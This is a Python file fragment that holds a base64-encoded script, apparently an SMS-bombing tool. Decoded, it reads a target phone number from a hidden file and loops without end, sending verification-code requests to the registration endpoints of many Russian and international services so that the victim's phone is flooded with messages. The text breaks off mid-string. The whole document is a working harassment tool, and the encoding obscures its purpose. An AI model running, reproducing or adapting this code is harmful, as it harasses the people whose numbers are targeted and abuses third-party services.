code = b'aW1wb3J0IG9zLCB0aW1lLCByZXF1ZXN0cwpmcm9tIGNvbG9yYW1hLmFuc2kgaW1wb3J0IEZvcmUKaW1wb3J0IHJhbmRvbQppbXBvcnQgc3RyaW5nCgpxID0gJyBfX18gIF9fICBfXyAgX19fICAgIF9fXyAgICAgICAgICAgICAgXycKdyA9ICcvIF9ffHwgIFwvICB8LyBfX3wgIHwgXyApIF9fXyAgXyBfXyAgfCB8X18gIF9fXyAgXyBfJwplID0gIlxfXyBcfCB8XC98IHxcX18gXCAgfCBfIFwvIF8gXHwgJyAgXCB8ICdfIFwvIC1fKXwgJ198IgpyID0gJ3xfX18vfF98ICB8X3x8X19fLyAgfF9fXy9cX19fL3xffF98X3x8Xy5fXy9cX19ffHxffCAnCnQgPSAnICAgICAgaHR0cHM6Ly9naXRodWIuY29tL21lc3RyMjI4L1Ntc0JvbWJlci5naXQnCnkgPSAnICAgICAgICAgICAgICAgIGh0dHBzOi8vdC5tZS9tZXN0cjIyOCAgICAgICAgICAnCgpkZWYgcmFuZG9tX2NoYXIoeSk6CiAgICAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5hc2NpaV9sZXR0ZXJzKSBmb3IgeCBpbiByYW5nZSh5KSkKCnByaW50KEZvcmUuQ1lBTiArIHEgKyAnXG4nICsgdyArICdcbicgKyBlICsgJ1xuJyArIHIgKyBGb3JlLkJMVUUgKyAnXG4nICsgdCArICdcbicgKyB5ICsgJ1xuJykKCnBob25lID0gLTEKZW1haWwgPSAtMQp0cnk6CiAgICBwaG9uZU51bWJlciA9IG9wZW4oJy5waG9uZScsICdyKycpCiAgICBwaG9uZSA9IGludChwaG9uZU51bWJlci5yZWFkKCkpCiAgICBwaG9uZU51bWJlci5jbG9zZSgpCiAgICB0cnk6CiAgICAgICAgb3Muc3lzdGVtKCdybSAucGhvbmUnKQogICAgICAgIGN5Y2xlQ291bnQgPSBvcGVuKCcuY291bnQnLCAncisnKQogICAgICAgIGNvdW50ID0gaW50KGN5Y2xlQ291bnQucmVhZCgpKQogICAgICAgIGN5Y2xlQ291bnQuY2xvc2UoKQogICAgICAgIG9zLnN5c3RlbSgncm0gLmNvdW50JykKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmV4Y2VwdDoKICAgIHBhc3MKdHJ5OgogICAgZW1haWxBZGRyZXNzID0gb3BlbignLmVtYWlsJywgJ3IrJykKICAgIGVtYWlsID0gZW1haWxBZGRyZXNzLnJlYWQoKQogICAgZW1haWxBZGRyZXNzLmNsb3NlKCkKICAgIHRyeToKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC5lbWFpbCcpCiAgICAgICAgY3ljbGVDb3VudCA9IG9wZW4oJy5jb3VudCcsICdyKycpCiAgICAgICAgY291bnQgPSBpbnQoY3ljbGVDb3VudC5yZWFkKCkpCiAgICAgICAgY3ljbGVDb3VudC5jbG9zZSgpCiAgICAgICAgb3Muc3lzdGVtKCdybSAuY291bnQnKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKZXhjZXB0OgogICAgcGFzcwoKcHJpbnQoRm9yZS5CTFVFICsgJyBb0J/RgNC+0YLQvtC60L7Qu11cbicpCgppZiBwaG9uZSAhPSAtMToKCiAgICBwcmludChGb3JlLkJMVUUgKyAnIFvQndC+0LzQtdGAINC00LvRjyDQsNGC0LDQutC4XTogJyArIEZvcmUuQ1lBTiArIHN0cihwaG9uZSkpCgogICAgaWYgY291bnQgPD0gMDoKICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFvQmtC+0LvQuNGH0LXRgdGC0LLQviDRhtC40LrQu9C+0LJdOiAnICsgRm9yZS5DWUFOICsgJ9Cx0LXRgdC60L7QvdC10YfQvdC+JykKICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFvQlNC70Y8g0L7RgdGC0LDQvdC+0LLQutC4INC90LDQttC80LggJyArIEZvcmUuQ1lBTiArICdDdHJsICsgWicgKyBGb3JlLkJMVUUgKyAnXScpCiAgICAgICAgY3ljbGUgPSAwCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBzdHIocGhvbmUpWzotMTBdICsgJy0nICsgc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vbG9naW4uYWxpZXhwcmVzcy5ydS9qb2luL1ByZUNoZWNrRm9yUGhvbmVSZWdpc3Rlci5odG0/Y2VsbFBob25lPXt9fSZ1bWlkVG9rZW49VDJnQU9KWXpjbC1CRWIwQjlwVnZUX3hKb2Q1aFlLamJ1WnhidG1BSEtjSy1fb2wwdGdaUEVkS0NiZC1fSk12NzlMTSUzRCZ1YT0lNUJvYmplY3QrUHJvbWlzZSU1RCZyZWdpc3RlckZyb209QUVfTUFJTl9SRUdJU1RFUiIuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHN0cihwaG9uZSkKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3lvdWxhLnJ1L3dlYi1hcGkvYXV0aC9yZXF1ZXN0X2NvZGUiLCBkYXRhPXsicGhvbmUiOiBlbnRlcn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vd3d3LmNpdGlsaW5rLnJ1L3JlZ2lzdHJhdGlvbi9jb25maXJtL3Bob25lLysiICsgc3RyKHBob25lKSArICIvIiwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHN0cihwaG9uZSkKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3d3dy50aW5rb2ZmLnJ1L2FwaS9jb21tb24vdjEvc2lnbl91cD9vcmlnaW49d2ViJTJDaWI1JTJDcGxhdGZvcm0mc2Vzc2lvbmlkPXFhdU9BYng5a0lBcnJCQ25yTU5pTDM0OUduVkI3dEY5Lm0xLXByb2QtYXBpMTM0Jnd1aWQ9OGVjZDY1YWUwNGYxNTZmODQ2NmFmZmRmOTY1YWYxNGEiLCBkYXRhPXsicGhvbmUiOiBlbnRlcn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9teS50ZWxlZ3JhbS5vcmcvYXV0aC9zZW5kX3Bhc3N3b3JkIixkYXRhPXsicGhvbmUiOiBlbnRlcn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBzdHIocGhvbmUpWzotMTBdICsgJy0nICsgc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vbG9naW4uYWxpZXhwcmVzcy5jb20vam9pbi9QcmVDaGVja0ZvclBob25lUmVnaXN0ZXIuaHRtP2NlbGxQaG9uZT17fSZ1bWlkVG9rZW49VDJnQU5HaHBVcllJc2luZVdDN3VMaGI4NlNSNFBfdjJaZFlLdWpLOFdlLTBXNkd2Q3FjcTRtWElLckFFS2Z4SEhUbyUzRCZ1YT0xNDAlMjN4U01yek0lMkYlMkJ6ekZZa1FvMjJpZiUyQkN0U2R2UjhrT25obWs1aktrbWJBZm9pJTJGNCUyRlAlMkZNejRlQVVhOUdjZlVFd2NrYkRKQ2VJWFhJNnhvJTJGVUtBNDBzTFVTWEEwM2hxenpuaEZBOFljWmJ6eldia2JqdnVsRnp4MkREM1Z0aHF6Rm52STFZNFU2U3h6b09iVjJFcU1CUUIydFAlMkJldEdteFFucDJYUUFsM2w5elByZFYyVTNWSHJ4MnFmRFAwUWh4ckpJd1BDUENHbUNHVUxNJTJGSVUzdVBhM3RSZHBqajhhMlg2NjIlMkIwVHdBM1h5WGZEc2xOaEw3cWQlMkZSZE4lMkJ4WEZDaFplJTJCUFZiTnpzcHlnNUxPem8lMkIlMkJGNTI4OGIwJTJGbnN5MUolMkJnRDVsQmtkTVpud1M0ZGZodHB6a2hvMXNReVk3cnBZbXglMkJ6cXJueHglMkJ4NzRjdWdMOW1rNHJyZ0tGRnNweFduck15NGh1cHE5eUclMkZTMTg4azM0TklBRmVFVzc0b1RkOVg5UXQwWFglMkJhbUJFbVFiTG42Q1U0R3NYSGZkdUo0Q092RW1pSEdnYUM2ayUyRlg5SnRqeEFXcVlpbEM1OG4yY0lSY2wzeldRMjk5UVZQV2RyQjFPRkJQUjVmQ3dXakdSWGFQbFVxNVpuNlFrc3hsb2twdWFma0FFU0FUSGVBZkdDJTJGUEp5Z3UlMkJwNWR1azVkWURKbmloNyUyRkduWDkxZFNsQ2VDYWszb2N2WTlEMkhROCUyQkZBTnd5NzVYNHJGQiUyRk01TVpqT3J1T09mU2RKaFUxVzloREZKQm1qbDhEOEF3cDRvYlpVJTJGZk1qS3lqSEZuUzNTZSUyQmF3alZ3NGFKQ1dhdU5LT3lQcFlBVFMlMkIyUEclMkZJczNjR3FjNVBOJTJGR3N1dVZRTVpoNHNkMnhxdXNocGZ6JTJCN3QwZmhJSG9vcDU3QnFrUGxpYWdVUmZDT3FteWMxRldWNjZVdHE4R1hhaThibCUyRlpCM0hQUjFRRXQlMkI4NG51SFBvTlhwSTFOd0FRSFVwTkZsVktXMURMejB3T2hvQ3pWcUdmVERDZ25ienVFSnFFWGkwaElxRzZmTW5BT3hZOFlmR2NDSTNZbzNHTmZweWhZWjZtdmFhRWV6UlU3OHgyVWNBSzFDbWE0MVhyWXBZaDRaVVN5QXJDQkpjdlJRNHV4WUVDYWVORWJoRmRJRmpVUW9WczUxVCUyRnNnUmJsb1A3OTNQJTJCd1dGcXhQajE4TklLJTJGT2YzRGZ1JTJCcnZvcUVPeXVvbExhRmc0WnhyJTJGbFViNG9WNnZEbWZra21uRTJzcExHcDJUMWxEdHpXaDB2SzEyNyUyRjlFNFJtN0QyVkl1cExWNGx1ZVVyVHVJJTJGcTIlMkZWc0xNWFhkY2VHTGVKYWdQaVNScWZYdlFzYmVFd2pmUWdRZlBxJTJCNiUyQkw1bUxGV21FRlBWTlNzb085UkJ1OGtBV0tOQVBTZHl4dzV5QkxRM01pQzNpb0pCc1BLQmZnc3BYek0xZ3BUdUlqMTFwU3J2OElQUW1pbGhTd0VzcWYxaXhKTVB2b1NlQ0dUREVRRlE5NDhyYjhEQVFENUFacEYlMkJqM25qMUw2T1dxQVdCM2pPMWZ5U0tBTDJWNGk4dG5TeklOS2pwNE03aFpNSU1DMEg0dXVaZ0RId28wdlV4VmRvUDh3QU0lMkIlMkI3bU1zZlRxWnJqeW5NbW1tU3FRMHRNUHZ5VlZranIxMXJXaUFiemZmTldWdDFZTVUwUyUyRmwlMkZtMmclMkI4T0w1M0ZuenVYekVENGNZcFBMUGhiVHEyQURrVnFVRWJSNmI3SnVVcHNTbkFHMmdkNzhNU3k1Z1ZNTjFHOE1aQ25nMmtDaWhoOU8lMkI2S2RuTk90clEmcmVnaXN0ZXJGcm9tPUFFX01BSU5fUkVHSVNURVImYngtdWE9MjE3IVBrMEdZR3ppR3o0Y0Z4NnhqWU5IZjZhMEFtcktyT2wycDAzampzckNaZGh1QyUyQmdjcDZrVlNIWHd5JTJGUWdrQ29TVEdpQmZyakV2MWZrVnNkT3FPWUtBSVkwUFZ1aks4cXhmZEc1aW1yRW9TTWlOVnA1RVNsRzFDdzNBMHBVd3ZXQnBHR2glMkZkd0t2TzkxRzJZNThQMnYwRUdHZnp1S3dqdkJHR0czeDU3UnZPOTExMjdxOFdpR3ZpTUdVNm5Kd2JXQnBNcDMlMkY1NzBDTzlHRzJLeDhXalB2NktnaUhScTZraDdwcDczJTJCWUxIejY4VnUlMkZQS3FNVWJ6RW1xd00xVUxEWDkzazNOVHcxdEsybGFBS3BTR1Frd1NadG4lMkZNWVRwRHlEdXczN2wxOUE1b1JWJTJGMXNFUmtGenp3bW5PTTl3emlsYiUyQjUzcSUyQjAxeXBTJTJGTE01WklZY2kzVVRoeHdjYTJ6bGZHcDUwaCUyRjU4JTJGdiUyRnd0cEM4cU41ME9LMEY1NjRGUEZsaFJyOThmcCUyRlgxTG1xYSUyQnd3NnFNTWJTa0VhMFE3SjYyZTRSTUczJTJGazclMkZ2TzkxRzJZeDhLMkJ2MTJHVXh1VGwzUGVHWDclMkYlMkJKdWx2TzkxRjIyd09xUkJlSjUxTDhFOXdDdkJHakwyNENlQkxkUGw4VFJMT0g2d1drZG9sNEdxTE5UUDd3aWlPNlZScmp5ZTNUJTJGREoxVlB2MFp0cm5rZ2hiaXd5d2FIRXFmb3ZtaGFJUjRoa0tPcW83MWY0JTJGYUdBc0huS1olMkJhMzNvVDJWNkVSUWV4bTZmYWoxcm9iciUyRnNHUlFpNnZzdGhHM2pCRWdrbiUyRkVOMU9WcGlnbFVNNzlVWDN2SzRjWkJjSExPekRhUkJPenRzbzB1MlRVT2FPVVNwVnNHdzlYN1pURUVsRUJOem1iWWtWSVZ0UVlnb2NZQXIlMkJyN2hnclZCUk5Ebk5Zc2tjSVBYVGNJNkhKYSUyQmFKREgwTUQxWm1YVSUyRnJlRmpuMFRaWkMyaG9WQUM4Y2duT256TkRsT1Vpa09vU21TbURSR0poclQlMkZhakZZdjB5Ym45QWtYczVTcktPWnV2Z0dIQ05qUlpLJTJCVkJWSnROQmRWZiUyQmtqV3RrY05KandUZlRmb3clMkJFeWIzeExWc3JZdzBTN2RIWWglMkZMJTJCcTBYRjI2TldncWFURFhQSUMlMkI0YkxPNno5ZjFmRDNialhxMk1XZiUyQnBnRks3RDJVMTR2anpZWVlmbldzZlNuVEtrNFQ4ZWI5JTJCZ0R0c0NSbk5KZjc4cGQ4SklOJTJGYnZENlh3a3JMeUhvejk1YTNSaFRmMjUwUHVHdVNqd3oxSENNMGoydURWdU9tM3hHV0J5UkNRNVcxdDFiaWowZm81ZU1vOGNoOElXdGRQT0phZk1tazdXVSUyQnZlRU9zQkRLSHZLWXVGdUVxNmh2ZGV3V1Jka0pYdnlrOXRLaTJSOTklMkZaTlZUa0lFWTRPZHFzZyUyRlg4c1RPcnk4d05Rd3Ntd1RHa2FBQ2F0VmtwMTNOVURtQWt4NVU0Sng4VTNUY3ExJTNEJTNEJmJ4LXVtaWR0b2tlbj1UMmdBTU92YWhnSEczNFc4bGZvTnk2OF9mdExaQ29ZRkJrYVRxdjZ4MlRFMFlZX05JTVdfWnBJMTRTajlSTnZrelp3JTNEJl9ieC12PTIuMC4zOSIuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9IHN0cihwaG9uZSlbMTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ydS5zaGVpbi5jb20vdXNlci9hdXRoL3NlbmRjb2RlP19sYW5nPXJ1Jl92ZXI9MS4xLjgiLCBkYXRhPXsiYWxpYXNfdHlwZSI6ICIyIiwgImFsaWFzIjogZW50ZXIsICJzY2VuZSI6ICJwaG9uZV9sb2dpbl9yZWdpc3Rlcl92ZXJpZnkiLCJ0aGlyZF9wYXJ0eV90eXBlIjogOCwiYXJlYV9jb2RlIjogNywiYXJlYV9hYmJyIjogIlJVIn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmFuZG9tRW1haWwgPSByYW5kb21fY2hhcigxMykrIkBtYWlsLnJ1IgogICAgICAgICAgICAgICAgZW50ZXIgPSAnJTJCJyArIHN0cihwaG9uZSlbOi0xMF0gKyAnJTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyMCcgKyBzdHIocGhvbmUpWzQ6LTRdICsgJyUyMC0lMjAnICsgc3RyKHBob25lKVs3Oi0yXSArICclMjAtJTIwJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3NwYi5zdG9ja21hbm4ucnUvYWpheC8/Y29udHJvbGxlcj11c2VyJmFjdGlvbj1yZWdpc3RlclVzZXImc3VybmFtZT1EbWl0cnkmbmFtZT1EbWl0cnkmcGhvbmU9e30mZW1haWw9e30mcGFzc3dvcmQ9SnlwYmlwLWRlaHB1OC1kdWhtb24mcGFzc3dvcmRfY29uZmlybT1KeXBiaXAtZGVocHU4LWR1aG1vbiZzZXNzaWQ9MTY4NDQ4Njg2MGU3YTgxMGY4N2E4NmQzMmIzN2Q3YWUmdG9rZW49MDNBR2RCcTI1Qm1EQm5WRnlqNDlRVjg2MU44S2JfQ1Njd3UzclNadDROQ0g0N3NmN1NXVlBDTm9wb3Eza2VQZG90UGxMTXYwbTVjZU9NdWk0MmNMRWlLclE0UFlNZWdrMTN2RHdCTUQwc2RkQmM2TE1wOFdqeG9lTWVpa0ZWQ25FSXM2MXRZQ0h2aEktNEpGMTJIal85bkl6aE5CcTlUWmQ0cGZhN0pDS2c3d0FBZ1RHNkxpYzhjWjkwSUpXdE42VFJlb1c2SENNYlZtUktJcy01aXE5U2FpVTAzdE03YjRFNjBkV2hGUnRyNlZUMDk1WHc1X01GeEM0SG9sa3NLQ3FyejhqYWo3WnJ4Rm1JUFFJekpFT191eE4xLUk1LTV4Q01nTElFcEVBSW0wN215TG9nQ3dXSGo0VEp4THJvMXM1RWgza3J1R1d2eFFHN213S3pjTl9UNTExVTZQTWRjWFYyelJyeXhPSFhpZzRvWnkwVGhTSTVsVlhvVGtVclgzcHkzZDFaOXNyVnBDeU96MFo0VzVFLXdqZXp0bEZJZTRzeDJGN2ZjRjBFaWYySWpQc2hOMFpmbl9FbjR3RlAzU2ZzR0pQWUl6OHNlMHlKN084UFJ5TWl5SlNZRjV0NFc1LXhaUXNHWFV3Z0w0QVhGZzlXZGRqTUJVa0dOdWo3Yk9nbWxoLU02MGJJSDB0dScuZm9ybWF0KGVudGVyLCByYW5kb21FbWFpbCksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpWzotMTBdICsgJygnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2JyYW5kc2hvcC5ydS94aHIvbG9naW4vYWN0aXZhdGlvbmNvZGUvJywgZGF0YT17J3Bob25lJzogZW50ZXJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJzgrKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJykrJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vemFyaW5hLnJ1L3Z1ZS1hcGkvYXV0aC9yZWNlaXZlc21zY29kZS5waHA/cGhvbmU9e30nLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncm91cHByaWNlLnJ1L2F1dGhfcGhvbmUvc2VuZF9waG9uZV90b2tlbicsIGRhdGE9eydwaG9uZSc6ZW50ZXJ9LCB0aW1lb3V